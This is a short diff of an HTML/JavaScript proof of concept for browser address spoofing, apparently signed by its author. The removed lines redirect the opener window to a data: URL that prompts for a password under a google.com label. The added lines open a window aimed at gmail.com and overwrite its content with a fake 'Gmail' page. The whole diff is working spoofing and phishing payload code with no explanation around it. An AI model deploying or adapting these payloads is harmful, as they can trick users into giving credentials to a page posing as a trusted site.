@@ -1,15 +1,9 @@
-<html>
-<body>
+<a href="https://www.gmail.com:443."target="aa"
+onclick="setTimeout('fake()',100)"><h1>click me</h1></a>
 <script>
-location='https://www.google.com';
-function go(){
-if(window.opener){
-window.opener.location = 'data:text/html,<title>test</title><script>'+
-'pass = prompt("https://google.com \nType your password:\n");'+
-'alert("Your Password is: "+pass);'+
-'<\/script>';
-}}
-go();
+function fake() {
+var t = window.open('javascript:alert(1)','aa');
+t.document.body.innerHTML = '<title>Gmail</title><H1>Fake Page!!!--hack by
+xisigr</H1>';
+}
 </script>
-</body>
-</html>
